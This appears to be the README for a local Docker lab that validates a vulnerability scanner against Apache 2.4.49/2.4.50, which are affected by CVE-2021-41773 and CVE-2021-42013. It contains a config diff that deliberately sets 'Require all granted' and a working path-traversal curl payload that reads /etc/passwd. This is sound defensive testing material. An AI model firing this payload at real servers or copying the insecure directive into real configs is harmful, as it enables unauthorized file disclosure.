# Level 1 lab

A controlled, repeatable target for validating Cerberus end to end: real vulnerable software
running in Docker, so a scan exercises the real tools rather than a stub that imitates a banner.

| Service | Port | Version | CVE-2021-41773 | CVE-2021-42013 |
|---|---|---|---|---|
| `httpd-2449` | `127.0.0.1:18081` | Apache 2.4.49 | exploitable | exploitable |
| `httpd-2450` | `127.0.0.1:18082` | Apache 2.4.50 | fixed | exploitable |

Both CVEs are in CISA KEV. The pair is deliberate: 2.4.50 fixed the first CVE but not the second,
so a correct scanner reports different findings for the two services. That makes it a
**precision** check as well as a detection check.

## Safety

These services are exploitable on purpose.

- Every port is bound to `127.0.0.1`. Nothing is reachable from the network. Keep it that way.
- Image tags are pinned. The vulnerability under test is a property of the version, and a
  floating tag would silently change what the lab proves.

## Why a custom config

The official `httpd:2.4.49` image ships with the safe default `Require all denied` on `/`, so it
is **not exploitable out of the box** — a scan against it would prove nothing. The lab mounts
[`httpd.vulnerable.conf`](httpd.vulnerable.conf), which is the stock config with exactly one
directive changed, so the difference is auditable:

```diff
 <Directory />
     AllowOverride none
-    Require all denied
+    Require all granted
 </Directory>
```

## Running it

```bash
docker compose -f lab/docker-compose.yml up -d

python cerberus.py scan --target 127.0.0.1 --authorized \
    --allow-private --no-subdomains --ports 18081,18082

docker compose -f lab/docker-compose.yml down
```

`--allow-private` is required because scope refuses loopback and private addresses by default,
so a scan cannot be aimed at internal infrastructure. It is a CLI flag or operator config, never
an API parameter.

To confirm the lab is exploitable independently of Cerberus:

```bash
curl -s --path-as-is "http://127.0.0.1:18081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -1
# root:x:0:0:root:/root:/bin/bash
```

(The path is `/cgi-bin/`, not `/icons/`: the stock config leaves the `/icons/` alias commented out.)

## What this does and does not prove

The lab proves the pipeline works against real software with real tools, and gives a repeatable
before/after target. It does **not** prove Cerberus handles the messiness of the internet —
CDNs, WAFs, rate limiting, unreachable hosts — which is what Level 2 and Level 3 are for. See
[docs/VALIDATION.md](../docs/VALIDATION.md) for what a real run produced, including where the
tools disagreed.
